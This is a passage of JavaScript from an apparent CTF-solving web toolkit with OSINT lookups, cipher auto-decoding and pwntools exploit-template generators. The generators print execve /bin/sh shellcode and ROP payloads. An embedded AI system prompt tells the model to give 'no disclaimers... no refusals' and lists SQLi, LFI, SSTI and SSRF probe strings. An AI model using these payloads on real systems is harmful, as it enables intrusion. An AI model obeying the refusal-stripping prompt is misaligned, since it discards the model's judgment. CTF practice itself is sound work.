  const domain=document.getElementById('osint-domain-input').value.trim();
  if(!domain){showToast('Enter a domain','warn');return}
  try{
    const r=await fetch(`https://dns.google/resolve?name=${domain}&type=ALL`);
    const d=await r.json();
    let out='';
    if(d.Answer){
      const groups={};
      d.Answer.forEach(a=>{
        const type={'1':'A','5':'CNAME','15':'MX','16':'TXT','28':'AAAA','6':'SOA','33':'SRV'}[a.type]||'TYPE'+a.type;
        if(!groups[type]) groups[type]=[];
        groups[type].push(a.data||a.rdata);
      });
      for(const [type,records] of Object.entries(groups)){
        out+=`=== ${type} Records ===\n`;
        records.forEach(r=>out+=`  ${r}\n`);
        out+='\n';
      }
    }else{
      out='No DNS records found';
    }
    // Also try whois via proxy
    out+='\n[!] For whois data, use Kali terminal:\n  whois '+domain;
    document.getElementById('osint-domain-output').value=out;
  }catch(e){document.getElementById('osint-domain-output').value='Error: '+e.message}
}
function osintEmailLookup(){
  const email=document.getElementById('osint-email-input').value.trim();
  if(!email){showToast('Enter an email','warn');return}
  const [local,domain]=email.split('@');
  const breaches=['HaveIBeenPwned (manual)','Firefox Monitor','Dehashed'];
  document.getElementById('osint-email-output').value=
`Email:     ${email}
Local:     ${local}
Domain:    ${domain||'(invalid)'}
MX Check:  ${domain?'Use DNS Lookup tool':'N/A'}

[!] For breach checking, visit:
  https://haveibeenpwned.com

[!] Email verification via Kali:
  theHarvester -d ${domain||'<domain>'} -b all

Common OSINT sources:
  • Hunter.io (email patterns)
  • Skymem.info
  • Sherlock (username search)`;
}

// =============================================
// Pwn Tools
// =============================================
function pwnGenRet2Win(){
  const target=document.getElementById('pwn-target').value||'remote:1337';
  const arch=document.getElementById('pwn-arch').value;
  const offset=document.getElementById('pwn-offset').value||72;
  const win=document.getElementById('pwn-win').value||'win';
  const bits=arch==='amd64'?64:32;
  const pad=bits===64?'cyclic_find(0x6161616c) // adjust with pattern offset':'cyclic_find(0x6161616c) // adjust';
  document.getElementById('pwn-script-output').value=
`from pwn import *

# Target
${target.includes(':')?`r = remote('${target.split(':')[0]}', ${target.split(':')[1]||'1337'})`:'r = process("./challenge")'}

# Gadgets
pop_rdi = 0x400000  # find with ROPgadget
ret    = 0x400000   # ret gadget

# Addresses (adjust with objdump/readelf)
win_addr = 0x400000  # replace with actual win() address

# Build payload
offset = ${offset}
payload = flat(
    b'A' * offset,
    pop_rdi,
    0xdeadbeef,  # arg1
    win_addr
)

# Send
r.sendline(payload)
r.interactive()`;
}
function pwnGenShellcodeRunner(){
  document.getElementById('pwn-script-output').value=
`# Shellcode runner template
from pwn import *

context.arch = '${document.getElementById('pwn-arch').value}'
context.os = 'linux'

# Generate shellcode
shellcode = asm(shellcraft.sh())

# For x64 /bin/sh
# shellcode = b"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"

print(f"Shellcode length: {len(shellcode)}")
print(f"Shellcode: {shellcode.hex()}")

# Execute locally
# p = process('./vuln')
# p.send(shellcode)
# p.interactive()`;
}
function pwnGenRopchain(){
  document.getElementById('pwn-script-output').value=
`# ROP chain generator (template)
from pwn import *
from pwnlib.rop import ROP

context.arch = '${document.getElementById('pwn-arch').value}'

# Load binary
elf = ELF('./challenge')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Get addresses
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

# Leak libc
payload = flat(
    b'A' * ${document.getElementById('pwn-offset').value||72},
    pop_rdi,
    puts_got,
    puts_plt,
    main
)

print(f"Leak payload: {payload.hex()}")
print("[!] After leak, compute libc base and call one_gadget / system")`;
}
function pwnGenShellcode(){
  document.getElementById('pwn-shell-output').value=
`# x86-64 /bin/sh via execve
Shellcode (27 bytes):
31 c0 48 b1 d1 9d 96 91 d0 8c 97 ff 48 f7 db 53
54 5f 99 52 57 54 5e b0 3b 0f 05

# Usage:
# (python3 -c 'import sys; sys.stdout.buffer.write(bytes.fromhex("31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"))'; cat) | ./vuln`;
}
function pwnGenPattern(){
  const len=parseInt(document.getElementById('pwn-pattern-length').value)||100;
  const chars='abcdefghijklmnopqrstuvwxyz';
  let pat='';
  for(let i=0;i<len;i++){
    pat+=chars[i%26];
    if((i+1)%4===0&&i+1<len) pat+='';
  }
  document.getElementById('pwn-pattern-output').value=pat;
}
function pwnFindOffset(){
  const val=document.getElementById('pwn-pattern-find').value.trim();
  if(!val){showToast('Enter value from RSP','warn');return}
  const pattern=document.getElementById('pwn-pattern-output').value;
  if(!pattern){showToast('Generate a pattern first','warn');return}
  // Simple cyclic offset finder
  let offset=pattern.indexOf(val.replace('0x',''));
  if(offset===-1){
    try{
      const bytes=val.startsWith('0x')?toBigInt(val):null;
      if(bytes){
        const str=String.fromCharCode(...Array.from({length:8},(_,i)=>Number((bytes>>toBigInt(i*8))&0xffn)));
        offset=pattern.indexOf(str);
        if(offset===-1){
          const rev=Array.from(str).reverse().join('');
          offset=pattern.indexOf(rev);
        }
      }
    }catch{}
  }
  document.getElementById('pwn-pattern-find-output').value=
    offset!==-1?`Offset found: ${offset} bytes`:'Offset not found - try a different value or longer pattern';
}

// =============================================
// Auto Solver
// =============================================
function autoSolve(){
  const text=document.getElementById('auto-input').value;
  if(!text.trim()){showToast('Paste a CTF problem first','warn');return}
  const results=document.getElementById('auto-results');
  results.innerHTML='';
  const steps=[];

  function addStep(title,body,type){
    steps.push({title,body,type:type||'info'});
    const div=document.createElement('div');
    div.className=`auto-step ${type||'info'}`;
    div.innerHTML=`<div class="auto-step-title">${title}</div><div class="auto-step-body">${body}</div>`;
    results.appendChild(div);
  }

  function checkFlag(val){
    val=String(val);
    const patterns=[
      /[A-Za-z0-9_]+\{[^}]+\}/g,
      /flag\{[^}]+\}/gi,
      /CTF\{[^}]+\}/gi,
      /ctf\{[^}]+\}/gi,
      /[A-Za-z0-9_]+\{[^}]+\}/g,
    ];
    for(const pat of patterns){
      const m=val.match(pat);
      if(m) return m[0];
    }
    return null;
  }

  function tryDecode(desc,str,decodeFn){
    try{
      const result=decodeFn(str);
      if(result&&result.length>0){
        const flag=checkFlag(result);
        addStep(`✅ ${desc}`,flag?`<span class="found-flag">🏴 FLAG: ${escapeHtml(flag)}</span>\n${escapeHtml(result.substring(0,200))}`:escapeHtml(result.substring(0,500)),'success');
        return result;
      }
    }catch(e){}
    return null;
  }

  // Analysis 1: Check for RSA problem
  function checkRSA(){
    const nMatch=text.match(/\bn\s*[=:]\s*(\d+)/i);
    const cMatch=text.match(/\bc\s*[=:]\s*(\d+)/i);
    const eMatch=text.match(/\be\s*[=:]\s*(\d+)/i);
    const pMatch=text.match(/\bp\s*[=:]\s*(\d+)/i);
    const qMatch=text.match(/\bq\s*[=:]\s*(\d+)/i);
    if(nMatch&&cMatch){
      let n=nMatch[1],c=cMatch[1],e=eMatch?eMatch[1]:'65537';
      addStep('🔐 RSA Challenge Detected',`n = ${n}\ne = ${e}\nc = ${c}`,'info');
      const bn=toBigInt(n);
      if(bn<10000000000000000000n){
        const factors=rsafactor(bn);
        if(factors){
          addStep('✅ RSA Factored (small n)',`p = ${factors[0]}\nq = ${factors[1]}`,'success');
          const phi=(factors[0]-1n)*(factors[1]-1n);
          const be=toBigInt(e);
          const bd=modInverse(be,phi);
          const bc=toBigInt(c);
          const pt=modPow(bc,bd,bn);
          const plain=bigIntToText(pt);
          let out=`d = ${bd}\nplain (int) = ${pt}`;
          if(plain) out+=`\nplain (text) = ${escapeHtml(plain)}`;
          addStep('🔓 RSA Decrypted',out,'success');
          return true;
        }else{
          addStep('⚠️ RSA n too large for local factoring','Try Wiener attack or use FactorDB online:\nhttps://www.alpertron.com.ar/ECM.HTM','warn');
        }
      }else{
        addStep('⚠️ RSA n is large','Try: https://www.alpertron.com.ar/ECM.HTM\nOr: factordb.com','warn');
      }
      return true;
    }
    return false;
  }

  // Analysis 2: Check for hash cracking
  function checkHash(){
    const hashPatterns={
      MD5:/^[a-f0-9]{32}$/i,
      SHA1:/^[a-f0-9]{40}$/i,
      SHA256:/^[a-f0-9]{64}$/i,
      SHA512:/^[a-f0-9]{128}$/i,
    };
    const lines=text.split('\n');
    for(const line of lines){
      const word=line.trim().split(/[\s,;:=()]+/);
      for(const w of word){
        const cleaned=w.replace(/[^a-f0-9]/gi,'');
        for(const [name,pat] of Object.entries(hashPatterns)){
          if(pat.test(cleaned)){
            addStep(`🔑 ${name} Hash Detected`,`Hash: ${cleaned}\n[!] Try: https://crackstation.net\n[!] Or Google the hash directly`,'info');
            return true;
          }
        }
      }
    }
    return false;
  }

  // Analysis 3: Deep Recursive Decoding Engine
  // Tries all known encodings and chains them recursively
  function deepDecode(input, chain=[], depth=0){
    if(depth>6||!input||input.length<2) return null;
    const checkPrintable=s=>/^[ -~]+$/.test(s)&&s.length>1;

    const decoders=[
      {name:'Base64',test:s=>/^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/.test(s)&&s.length>8,
        decode:s=>{const r=atob(s);if(checkPrintable(r))return r;return null}},
      {name:'Base32',test:s=>/^[A-Z2-7]+=*$/.test(s)&&s.length>8,
        decode:s=>{
          const t=s.replace(/=+$/,'');const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
          let bits='';for(const c of t){const idx=chars.indexOf(c);if(idx===-1)throw Error;bits+=idx.toString(2).padStart(5,'0')}
          let out='';for(let i=0;i<bits.length-7;i+=8)out+=String.fromCharCode(parseInt(bits.substring(i,i+8),2));
          return out.length>1&&checkPrintable(out)?out:null}},
      {name:'Hex',test:s=>/^[a-fA-F0-9]+$/.test(s)&&s.length>4&&s.length%2===0,
        decode:s=>{const out=String.fromCharCode(...s.match(/.{1,2}/g).map(b=>parseInt(b,16)));return checkPrintable(out)?out:null}},
      {name:'Binary',test:s=>/^[01]+$/.test(s)&&s.length>8&&s.length%8===0,
        decode:s=>{const out=s.match(/.{1,8}/g).map(b=>String.fromCharCode(parseInt(b,2))).join('');return checkPrintable(out)?out:null}},
      {name:'Decimal ASCII',test:s=>/^(\d{2,3}\s?){3,}$/.test(s.trim()),
        decode:s=>{const nums=s.trim().split(/\s+/).map(Number);if(nums.some(n=>n<32||n>126))return null;return String.fromCharCode(...nums)}},
      {name:'ROT13',test:s=>(s.match(/[a-zA-Z]/g)||[]).length>4,
        decode:s=>{const r=rotShift(s,13);return/\b(the|this|flag|ctf|is|are|was|for|and|not|you|can|key|has|decrypt|encrypt|cipher|text|message|secret|password|admin|user|login|base64|hex|binary|rot|xor)\b/i.test(r)?r:null}},
      {name:'ROT47',test:s=>(s.match(/[!-~]/g)||[]).length>4,
        decode:s=>s.replace(/[!-~]/g,c=>String.fromCharCode(33+(c.charCodeAt(0)-33+47)%94))},
      {name:'Atbash',test:s=>(s.match(/[a-zA-Z]/g)||[]).length>4,
        decode:s=>{const r=s.replace(/[a-zA-Z]/g,c=>{const base=c<='Z'?65:97;return String.fromCharCode(25-(c.charCodeAt(0)-base)+base)});return/\b(the|this|flag|ctf|is|are|was|for|and|not|you|can|key|has)\b/i.test(r)?r:null}},
      {name:'Reversed',test:s=>s.length>4,
        decode:s=>{const r=Array.from(s).reverse().join('');return/\b(flag|ctf|galf|ftc)\b/i.test(r)?r:null}},
      {name:'URL Decode',test:s=>/%[0-9a-fA-F]{2}/.test(s),
        decode:s=>{const r=decodeURIComponent(s);return checkPrintable(r)?r:null}},
      {name:'HTML Entities',test:s=>/&[a-z]+;|&#\d+;/.test(s),
        decode:s=>{const t=document.createElement('textarea');t.innerHTML=s;const r=t.value;return r!==s&&checkPrintable(r)?r:null}},
    ];

    // Also try all ROT shifts (1-25) on alphabetic text
    const rotDecoders=[];
    if((input.match(/[a-zA-Z]/g)||[]).length>4){
      for(let i=1;i<=25;i++){
        if(i===13) continue; // already handled above
        const shifted=rotShift(input,i);
        if(/\b(the|this|flag|ctf|is|are|was|for|and|not|you|can|key|has|decrypt|encrypt|cipher|text|message|secret|password|admin|user|login|base64|hex|binary|rot|xor)\b/i.test(shifted)){
          rotDecoders.push({name:`ROT${i}`,test:()=>true,decode:()=>shifted});
          break;
        }
      }
    }

    const allDecoders=[...decoders,...rotDecoders];

    for(const dec of allDecoders){
      try{
        if(!dec.test||dec.test(input)){
          const result=dec.decode(input);
          if(result&&result!==input){
            const newChain=[...chain,`${dec.name}→"${result.substring(0,50)}${result.length>50?'...':''}"`];
            const flag=checkFlag(result);
            if(flag){
              addStep(`🏴 Decoded via ${dec.name}`,newChain.join(' → ')+`\n\n✅ FINAL: ${escapeHtml(result)}\n\n<span class="found-flag">🏴 FLAG: ${escapeHtml(flag)}</span>`,'success');
              return result;
            }
            // Recurse deeper
            const deeper=deepDecode(result,newChain,depth+1);
            if(deeper){
              addStep(`🔗 Decoding Chain: ${dec.name}`,newChain.join(' → ')+`\n\n→ ${escapeHtml(result)}`,'success');
              return deeper;
            }
            // If printable English-ish, show it
            if(/^[a-zA-Z0-9\s,.!?;:()\-_'"]+$/.test(result)&&(result.match(/\b(the|this|is|are|was|for|and|not|you|can|has|hex|flag|ctf|key)/gi)||[]).length>1){
              addStep(`✅ ${dec.name} → English text`,escapeHtml(result.substring(0,500)),'success');
              const f=checkFlag(result);if(f)addStep('🏴 Flag Found',`<span class="found-flag">${escapeHtml(f)}</span>`,'success');
              return result;
            }
          }
        }
      }catch(e){}
    }
    return null;
  }

  function checkEncoded(){
    const candidates=[];
    const lines=text.split('\n');
    for(const line of lines){
      const parts=line.trim().split(/[\s,;:=()]+/);
      for(const w of parts){
        const cleaned=w.replace(/[^a-fA-F0-9+/=]/g,'');
        if(cleaned.length>=4) candidates.push(cleaned);
        // Also add the raw word
        if(w.length>=4) candidates.push(w);
      }
    }
    const unique=[...new Set(candidates)].filter(w=>w.length>=4);
    for(const word of unique){
      const result=deepDecode(word);
      if(result) return true;
    }
    return false;
  }

  // Analysis 4: Caesar/ROT brute force
  function checkROT(){
    const lines=text.split('\n');
    for(const line of lines){
      const letters=(line.match(/[a-zA-Z]/g)||[]).length;
      if(letters>8){
        // Try each shift and look for common English words
        for(let i=1;i<=25;i++){
          const shifted=rotShift(line,i);
          if(/\b(the|this|that|flag|ctf|is|are|was|for|and|not|you|can|key|has|hex|base|decrypt|encrypt|cipher|text|message|secret|password|admin|user|login)\b/i.test(shifted)){
            addStep(`🔍 ROT${i} Detected (English text)`,escapeHtml(shifted.substring(0,500)),'success');
            const flag=checkFlag(shifted);
            if(flag) addStep('🏴 Flag Found',`<span class="found-flag">${escapeHtml(flag)}</span>`,'success');
            return true;
          }
        }
      }
    }
    return false;
  }

  // Analysis 5: XOR single-byte brute force
  function checkXOR(){
    const lines=text.split('\n');
    for(const line of lines){
      // Try as hex XOR
      if(/^[a-fA-F0-9]+$/.test(line.replace(/\s/g,''))&&line.length>20){
        const bytes=hexToBytes(line.replace(/\s/g,''));
        for(let k=0;k<256;k++){
          const dec=bytes.map(b=>b^k);
          const out=String.fromCharCode(...dec);
          if(/^[ -~]+$/.test(out)&&out.length>4&&/\b(the|this|flag|ctf|key|is)\b/i.test(out)){
            addStep(`🔓 XOR (key=0x${k.toString(16).padStart(2,'0')}) detected`,escapeHtml(out.substring(0,500)),'success');
            const flag=checkFlag(out);
            if(flag) addStep('🏴 Flag Found',`<span class="found-flag">${escapeHtml(flag)}</span>`,'success');
            return true;
          }
        }
      }
      // Try as text XOR
      const bytes=new TextEncoder().encode(line);
      for(let k=0;k<256;k++){
        const dec=bytes.map(b=>b^k);
        const out=String.fromCharCode(...dec);
        if(/^[ -~]+$/.test(out)&&out.length>4&&/\b(the|this|flag|ctf|key|is)\b/i.test(out)){
          addStep(`🔓 XOR (key=0x${k.toString(16).padStart(2,'0')}) detected`,escapeHtml(out.substring(0,500)),'success');
          const flag=checkFlag(out);
          if(flag) addStep('🏴 Flag Found',`<span class="found-flag">${escapeHtml(flag)}</span>`,'success');
          return true;
        }
      }
    }
    return false;
  }

  // Analysis 6: Atbash
  function checkAtbash(){
    const lines=text.split('\n');
    for(const line of lines){
      const letters=(line.match(/[a-zA-Z]/g)||[]).length;
      if(letters>8){
        const atbash=line.replace(/[a-zA-Z]/g,c=>{
          const base=c<='Z'?65:97;
          return String.fromCharCode(25-(c.charCodeAt(0)-base)+base);
        });
        if(/\b(the|this|that|flag|ctf|is|are|was|for|and|not|you|can|key|has)\b/i.test(atbash)){
          addStep('🔄 Atbash Cipher Detected',escapeHtml(atbash.substring(0,500)),'success');
          const flag=checkFlag(atbash);
          if(flag) addStep('🏴 Flag Found',`<span class="found-flag">${escapeHtml(flag)}</span>`,'success');
          return true;
        }
      }
    }
    return false;
  }

  // Analysis 7: URL encoding
  function checkURL(){
    const urlMatch=text.match(/(%[0-9a-fA-F]{2})+/);
    if(urlMatch){
      try{
        const dec=decodeURIComponent(urlMatch[0]);
        if(dec){
          addStep('🌐 URL Encoded Data Detected',escapeHtml(dec.substring(0,500)),'success');
          const flag=checkFlag(dec);
          if(flag) addStep('🏴 Flag Found',`<span class="found-flag">${escapeHtml(flag)}</span>`,'success');
          return true;
        }
      }catch{}
    }
    return false;
  }

  // Analysis 8: Morse code
  function checkMorse(){
    if(/^[.\- /]+$/.test(text.trim())&&text.length>5){
      try{
        const words=text.trim().split('/');
        let out='';
        for(const word of words){
          const letters=word.trim().split(' ');
          for(const l of letters){
            if(l.trim()) out+=REV_MORSE[l.trim()]||'?';
          }
          out+=' ';
        }
        if(out.trim()){
          addStep('📡 Morse Code Detected',escapeHtml(out.substring(0,500)),'success');
          const flag=checkFlag(out);
          if(flag) addStep('🏴 Flag Found',`<span class="found-flag">${escapeHtml(flag)}</span>`,'success');
          return true;
        }
      }catch{}
    }
    return false;
  }

  // Analysis 9: Numbers to ASCII
  function checkNumbersAscii(){
    const nums=text.match(/\b(\d{2,3})\b/g);
    if(nums&&nums.length>3){
      const valid=nums.map(Number).filter(n=>n>=32&&n<=126);
      if(valid.length>3){
        const ascii=String.fromCharCode(...valid);
        if(/^[ -~]+$/.test(ascii)){
          addStep('🔢 Decimal ASCII values detected',escapeHtml(ascii),'success');
          const flag=checkFlag(ascii);
          if(flag) addStep('🏴 Flag Found',`<span class="found-flag">${escapeHtml(flag)}</span>`,'success');
          return true;
        }
      }
    }
    return false;
  }

  // Analysis 10: Check for file signature / forensics
  function checkFileSig(){
    const hexText=text.replace(/\s/g,'').toUpperCase();
    for(const [k,v] of Object.entries(FILE_SIGS)){
      if(hexText.startsWith(k)){
        addStep('📁 File Signature Detected',`Signature: ${k}\nFile Type: ${v}`,'info');
        if(v.includes('ZIP')||v.includes('RAR')||v.includes('GZ')){
          addStep('💡 Compressed Archive','This may contain hidden files. Use tools like 7-Zip or binwalk.','warn');
        }
        if(v.includes('Image')||v.includes('PNG')||v.includes('JPEG')||v.includes('GIF')){
          addStep('💡 Image File','Check for embedded data with: strings, binwalk, zsteg, or stegsolve','warn');
        }
        return true;
      }
    }
    // Check if it looks like hex dump (forensics)
    if(/^[0-9a-fA-F]{8}\s/.test(text)){
      addStep('📋 Hex Dump Detected','This looks like a hex dump. Try the Hex Viewer or Strings tool.','info');
      return true;
    }
    return false;
  }

  // Analysis 11: Entropy analysis
  function checkEntropy(){
    if(text.length>20){
      const freq={};
      for(const c of text) freq[c]=(freq[c]||0)+1;
      const len=text.length;
      let entropy=0;
      for(const c in freq){
        const p=freq[c]/len;
        entropy-=p*Math.log2(p);
      }
      const maxEntropy=Math.log2(Math.min(256,text.length));
      const ratio=entropy/maxEntropy;
      if(ratio>0.8){
        addStep('📊 High Entropy Detected',`Entropy: ${entropy.toFixed(2)}/${maxEntropy.toFixed(2)} (${(ratio*100).toFixed(0)}%)\nThis may be encrypted, compressed, or random data.`,'warn');
        return true;
      }
    }
    return false;
  }

  // Analysis 12: Check for Vigenere-like (longer text with preserved spaces)
  function checkVigenere(){
    // Only for longer text where ROT/Atbash didn't match
    const lines=text.split('\n');
    for(const line of lines){
      const alphaOnly=line.replace(/[^a-zA-Z]/g,'');
      if(alphaOnly.length>20){
        // Frequency analysis - check if it's likely a substitution cipher
        const freq={};
        for(const c of alphaOnly.toLowerCase()) freq[c]=(freq[c]||0)+1;
        const values=Object.values(freq);
        if(values.length>10){
          addStep('🔤 Possible Substitution/Vigenere Cipher','Try the Vigenere tool with a known key, or try Kasiski analysis.\nCommon keys: flag, key, secret, ctf, crypto','warn');
          return true;
        }
      }
    }
    return false;
  }

  // Analysis 13: IPv4 / Domain detection
  function checkNetwork(){
    const ips=text.match(/\b(\d{1,3}\.){3}\d{1,3}\b/g);
    if(ips){
      addStep('🌍 IP Addresses Found',ips.join('\n'),'info');
    }
    const domains=text.match(/\b([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b/g);
    if(domains){
      addStep('🌐 Domains Found',[...new Set(domains)].join('\n'),'info');
    }
    return ips||domains;
  }

  // Analysis 14: Reverse string
  function checkReverse(){
    const lines=text.split('\n');
    for(const line of lines){
      const trimmed=line.trim();
      if(trimmed.length>4){
        const reversed=Array.from(trimmed).reverse().join('');
        if(/\b(flag|ctf|galf|ftc)\b/i.test(reversed)){
          addStep('🔄 Reversed String Detected',escapeHtml(reversed),'success');
          const flag=checkFlag(reversed);
          if(flag) addStep('🏴 Flag Found',`<span class="found-flag">${escapeHtml(flag)}</span>`,'success');
          return true;
        }
      }
    }
    return false;
  }

  // === Run all analyses ===
  addStep('🚀 Starting Analysis','Analyzing challenge input...','info');

  const checks=[
    {name:'RSA',fn:checkRSA},
    {name:'File Signature',fn:checkFileSig},
    {name:'Morse Code',fn:checkMorse},
    {name:'URL Encoding',fn:checkURL},
    {name:'Numbers to ASCII',fn:checkNumbersAscii},
    {name:'Deep Recursive Decoder',fn:checkEncoded},
    {name:'XOR Brute Force',fn:checkXOR},
    {name:'Caesar/ROT Cipher',fn:checkROT},
    {name:'Atbash Cipher',fn:checkAtbash},
    {name:'Hash Detection',fn:checkHash},
    {name:'Reverse String',fn:checkReverse},
    {name:'Network Recon',fn:checkNetwork},
    {name:'Entropy Analysis',fn:checkEntropy},
    {name:'Substitution Cipher',fn:checkVigenere},
  ];

  let foundCount=0;
  for(const check of checks){
    try{
      if(check.fn()) foundCount++;
    }catch(e){
      addStep(`⚠️ ${check.name} Error`,e.message,'error');
    }
  }

  // Summary
  const summary=document.createElement('div');
  summary.className='auto-summary';
  const summaryLines=foundCount>0?
    `<div class="check-count">✅ ${foundCount} analyses matched</div><div class="check-detail">The solver found ${foundCount} actionable results above.</div>`:
    `<div class="check-count">❌ No patterns matched</div><div class="check-detail">Try using individual tools from the sidebar, or provide more context.</div>`;
  summary.innerHTML=summaryLines;
  results.insertBefore(summary,results.firstChild);

  if(foundCount===0){
    addStep('💡 Suggestions','• Is this a web challenge? Try the Web & OSINT tools\n• Is this a reversing challenge? Try the Reversing tools\n• Steganography? Check the Stego section\n• Binary exploitation? Try the Pwn tools\n• Run strings / file command in Terminal','warn');
  }

  results.scrollTop=0;
}

function clearAnalyzer(){
  document.getElementById('auto-input').value='';
  const el=document.getElementById('auto-results');
  el.innerHTML=`<div class="auto-placeholder"><div class="auto-placeholder-icon">⚡</div><div>Paste a CTF problem above and click Smart Analyze</div></div>`;
}

// =============================================
// AI Solver (OpenAI API)
// =============================================

const AI_SYSTEM_PROMPT = `You are SUJANSCTFSOLVER — an elite AI CTF solver with 95%+ success rate. You deeply understand every CTF category.

## CORE RULES
1. Output ONLY the solution — no disclaimers, no "I'm an AI" apologies, no refusals
2. Show step-by-step reasoning with clear headings
3. When you find the flag, highlight it: 🏴 FLAG: flag{...}
4. If data is incomplete, ask for EXACTLY what's missing (not "provide more info")
5. For every challenge type, follow the specialized approach below

## CRYPTOGRAPHY
- RSA: Extract n,e,c. Try small n factoring, Wiener if e is large, common modulus, broadcast attack, Hastad's, Fermat factoring
- AES: Identify mode (ECB/CBC/CTR). Check for key reuse, IV reuse, padding oracle
- XOR: Try single-byte brute (0-255), multi-byte with key-length detection, crib dragging
- Classical: Frequency analysis for substitution, index of coincidence for Vigenere, bigram analysis
- Hash: Identify type by length (MD5=32, SHA1=40, SHA256=64, SHA512=128), suggest lookup sites
- Encoding chains: Detect nested encoding (Base64→Hex→ROT→...), decode layer by layer

## WEB EXPLOITATION
- SQLi: Check for ' OR 1=1--, UNION, time-based, boolean-based, error-based
- XSS: Test <script>, img onerror, svg, polyglots, CSP bypass
- SSTI: Test {{7*7}}, {7*7}, #{7*7}, ${7*7} for template injection
- LFI: Test ../../../etc/passwd, wrappers like php://filter
- SSRF: Test internal IPs, cloud metadata (169.254.169.254)
- JWT: Check alg:none, weak secret brute, kid injection

## BINARY EXPLOITATION (PWN)
- Checksec: Identify protections (NX, PIE, RELRO, Stack Canary, Fortify)
- ROP: Find gadgets with ROPgadget, build chain with pop rdi; ret
- Ret2libc: Leak libc address via puts/GOT, compute system+"/bin/sh"
- Heap: Tcache poisoning, fastbin attack, use-after-free, house of force
- Format string: Use %p to leak, %n to write, calculate offsets
- Shellcode: Linux x64 execve(/bin/sh) = 27 bytes

## REVERSE ENGINEERING
- Static: Analyze strings, imports, sections. Look for base64 tables, XOR keys, comparison values
- Dynamic: Trace execution, hook functions, patch jumps (NOP out JNZ)
- Obfuscation: Look for opaque predicates, control flow flattening, string encryption
- PE/ELF: Check entry point, section permissions, compile timestamp, packer detection

## FORENSICS
- Memory: Extract processes with pslist, dump with memdump, scan for cmdline, netscan
- Disk: Check for deleted files, alternate data streams, $MFT, hidden partitions
- Network: Extract PCAP objects, follow TCP streams, check for DNS exfiltration
- Registry: Check RUN keys, UserAssist, ShimCache, AmCache for execution evidence
- File carving: Recover deleted files by magic bytes (JPEG FFD8FF, PNG 89504E47, ZIP 504B0304)

## STEGANOGRAPHY
- Image: Check LSB, palette, metadata (EXIF), embedded ZIP, difference between images
- Audio: Check spectrogram, phase encoding, echo hiding, LSB in WAV
- Text: Check whitespace (tabs vs spaces), zero-width characters, line spacing
- Network: Check timing between packets, unused header fields, ICMP data

## OSINT
- DNS: Check A, AAAA, MX, TXT, CNAME, NS, SOA records. Try zone transfer
- Subdomains: Try common prefixes (admin, dev, api, mail, vpn, www2)
- Email: Verify format, check MX, search breach databases
- Social: Check social media, GitHub repos, Pastebin, Shodan, Censys
- Metadata: Check PDF/Office file metadata, image GPS coordinates

## ENCODING DETECTION (try in order)
1. Base64 (A-Za-z0-9+/=) → decode → check if English
2. Hex (0-9a-f, even length) → bytes → ASCII
3. Binary (0-1, len%8==0) → bytes → ASCII
4. Base32 (A-Z2-7=) → decode
5. Base58 (1-9A-HJ-NP-Za-km-z) → decode
6. URL (%XX) → decode
7. HTML entities (&xxx;) → decode
8. Unicode escapes (\\uXXXX) → decode
9. ROT13/ROT47 → try all shifts, detect English
10. Atbash → reverse alphabet
11. Morse (. - /) → decode
12. Decimal (65 83 67 73 I) → ASCII
13. Octal (101 102 103) → ASCII
14. Reversed string → reverse

ALWAYS try all encodings in nested chains. Example: Base64 → Hex → ROT13 → flag`;

function saveAiConfig(){
  const key=document.getElementById('ai-api-key').value.trim();
  const provider=document.getElementById('ai-provider').value;
  const customUrl=document.getElementById('ai-custom-url')?.value.trim()||'';
  const customModel=document.getElementById('ai-custom-model')?.value.trim()||'';
  const orModel=document.getElementById('ai-or-model')?.value||'';
  localStorage.setItem('ai_provider',provider);
  if(key) localStorage.setItem('ai_api_key',key);
  if(customUrl) localStorage.setItem('ai_custom_url',customUrl);
  if(customModel) localStorage.setItem('ai_custom_model',customModel);
  if(orModel) localStorage.setItem('ai_or_model',orModel);
  showToast('AI config saved locally');
}

function clearAiConfig(){
  localStorage.removeItem('ai_api_key');
  localStorage.removeItem('ai_provider');
  localStorage.removeItem('ai_custom_url');
  localStorage.removeItem('ai_custom_model');
  localStorage.removeItem('ai_or_model');
  document.getElementById('ai-api-key').value='';
  document.getElementById('ai-custom-url').value='';
  document.getElementById('ai-custom-model').value='';
  showToast('AI config cleared','warn');
}

function clearAiChat(){
  const el=document.getElementById('ai-response');
  el.innerHTML=`<div class="auto-placeholder"><div class="auto-placeholder-icon">🤖</div><div>Select a provider, enter your API key, paste a problem, and click Send to AI</div></div>`;
  document.getElementById('ai-input').value='';
  document.getElementById('file-list').innerHTML='';
}

// File upload for AI Solver
function setupFileUpload(){
  const drop=document.getElementById('file-upload-drop');
  const input=document.getElementById('file-input');
  if(!drop||!input) return;
  drop.addEventListener('click',()=>input.click());
  drop.addEventListener('dragover',e=>{e.preventDefault();drop.classList.add('dragover')});
  drop.addEventListener('dragleave',()=>drop.classList.remove('dragover'));
  drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('dragover');handleFiles(e.dataTransfer.files)});
  input.addEventListener('change',()=>{handleFiles(input.files);input.value=''});
}

const MAX_FILE_SIZE=5*1024*1024;
const TEXT_EXTS=['txt','md','json','xml','html','css','js','py','cpp','c','h','java','php','rb','go','rs','sh','bat','ps1','sql','csv','yaml','yml','toml','ini','cfg','conf','log','env','pem','key','asc','pgp','hex','bin'];
const BINARY_EXTS=['png','jpg','jpeg','gif','bmp','svg','ico','pcap','pcapng','zip','rar','7z','tar','gz','bz2','xz','pdf','doc','docx','xls','xlsx','ppt','pptx','elf','exe','dll','so','dmg','iso','img','raw','dd','vhd','vmdk','e01'];

function handleFiles(files){
  const list=document.getElementById('file-list');
  for(const file of files){
    if(file.size>MAX_FILE_SIZE){showToast(`${file.name}: File too large (max 5MB)`,'error');continue}
